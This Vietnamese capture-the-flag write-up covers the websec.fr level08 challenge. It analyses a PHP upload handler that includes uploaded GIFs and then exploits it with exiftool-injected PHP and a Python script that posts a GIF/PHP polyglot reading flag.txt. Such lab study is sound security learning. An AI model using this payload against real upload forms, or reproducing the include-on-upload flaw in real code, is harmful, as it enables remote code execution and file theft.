# Đoạn code xử lý logic
```HTML
<div class="container">
    <div class="row">
        <form action="" method="post" enctype="multipart/form-data" class='form-inline'>
            <div class='form-group'>
                <input type="file" name="fileToUpload" id="fileToUpload">
                <p class="help-block">Select image (.gif only) to upload</p>
            </div>
            <div class='form-group'>
                <input class='btn btn-default' type="submit" value="Upload Image" name="submit">
            </div>
        </form>
    </div> 
</div>   
```
```PHP
<?php if (isset ($_FILES) && !empty ($_FILES)): ?>
<?php
    $uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');

    if (file_exists ($uploadedFile)) { unlink ($uploadedFile); }

    if ($_FILES['fileToUpload']['size'] <= 50000) {
        if (getimagesize ($_FILES['fileToUpload']['tmp_name']) !== false) {
            if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) {
                move_uploaded_file ($_FILES['fileToUpload']['tmp_name'], $uploadedFile);
                echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">'. htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';
                echo '<pre>';
                include_once($uploadedFile);
                echo '</pre>';
                unlink($uploadedFile);
            } else { echo '<p class="text-danger">The file is not a GIF</p>'; }
        } else { echo '<p class="text-danger">The file is not an image</p>'; }
    } else { echo '<p class="text-danger">The file is too big</p>'; }
?>
<?php endif ?>
```

# Phân tích luồng hoạt động
```PHP
$uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');
if (file_exists ($uploadedFile)) { unlink ($uploadedFile); }
```
File ảnh sau khi được upload lên sẽ được thực hiện phép nối chuỗi. Ví dụ, khi bạn upload 1 file có tên `sample.gif`, sau khi được upload lên tên file sẽ trở thành `/uploads/<hash-sha1-của-sample.gif>.gif`. Sau đó kiểm tra trong hệ thống xem đã có file nào có tên tương tự chưa, nếu có thực hiện xóa file cũ => điều này hạn chế việc web bị khai thác các lỗ hổng như: Path Traversal,Null Byte Injection.  

```PHP
if ($_FILES['fileToUpload']['size'] <= 50000) {
    if (getimagesize ($_FILES['fileToUpload']['tmp_name']) !== false) {
        if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) {
            move_uploaded_file ($_FILES['fileToUpload']['tmp_name'], $uploadedFile);
            echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">'. htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';
            echo '<pre>';
            include_once($uploadedFile);
            echo '</pre>';
            unlink($uploadedFile);
        } else { echo '<p class="text-danger">The file is not a GIF</p>'; }
    } else { echo '<p class="text-danger">The file is not an image</p>'; }
} else { echo '<p class="text-danger">The file is too big</p>'; }
```  

Đoạn trên thực hiện việc xử lý file được tải lên.
* Đầu tiên là kích thước của file không được quá 50kb.  
* Sau đó thông qua hàm `getimagesize()` và `exif_imagetype()` để kiểm tra xem có phải 1 file ảnh hợp lệ hay không  
* Nếu qua được 3 câu lệnh điều kiện này, file sẽ được thực thi qua câu lệnh `include_once`, sau đó sẽ được xóa khi kết thúc câu lệnh điều kiện 

**Nhận xét**: Đoạn mã này chỉ kiểm tra "Nội dung file có chứa cấu trúc ảnh hay không". Nó rất tốt để lọc người dùng thông thường upload nhầm file.Tuy nhiên, hacker có thẻ chèn các đoạn mã độc vào vùng dữ liệu trống của file gif.  
# Khai thác
## Thủ công
Tôi sử dụng exiftool để có thể chèn các comment vào vùng dữ liệu trống của gif,cú pháp:  
```bash
exiftool -Comment="<?php print_r(scandir('.')); ?>" sample.gif
```  
Câu lệnh trên sẽ cho chúng ta thấy toàn bộ các file của thư mục hiện tại dưới dạng array
```
GIF89a!bArray
(
    [0] => .
    [1] => ..
    [2] => flag.txt
    [3] => index.php
    [4] => php-fpm.sock
    [5] => source.php
    [6] => uploads
)
```  

Sau đó tiền hành đọc file flag:  
```bash
exiftool -Comment="<?php echo file_get_contents('flag.txt'); ?>" sample.gif
```   
## Tự động
Bạn có thể tự động quá quy trình thông qua đoạn mã python bên dưới
```Python
import requests

burp0_url = "https://websec.fr:443/level08/index.php"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://websec.fr/",
    "Content-Type": "multipart/form-data; boundary=----geckoformboundarya021d39ec08f49967bb9aa6fe712ce8a",
    "Origin": "https://websec.fr",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}
burp0_data = "------geckoformboundarya021d39ec08f49967bb9aa6fe712ce8a\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"sample.gif\"\r\nContent-Type: image/gif\r\n\r\nGIF89a!b<?php print_r(scandir('.'));\r\necho file_get_contents('flag.txt'); ?>\r\n------geckoformboundarya021d39ec08f49967bb9aa6fe712ce8a\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload Image\r\n------geckoformboundarya021d39ec08f49967bb9aa6fe712ce8a--\r\n"
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
```

